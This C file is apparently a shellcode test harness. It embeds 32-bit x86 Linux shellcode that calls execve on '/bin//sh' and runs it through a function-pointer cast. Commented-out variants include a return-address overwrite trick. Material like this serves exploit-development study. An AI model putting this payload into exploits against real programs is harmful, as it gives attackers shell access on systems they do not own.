#include<stdio.h>
#include<string.h>

char shellcode[]="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

int main(){

    /* char *shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

    (*(void(*)()) shellcode)(); */

     /* int *ret;
    ret = (int)&ret + 2;
    (*ret) = (int)shellcode;
  */

    int(*f)() = (int(*)())shellcode;
    f();

    return 0;   
}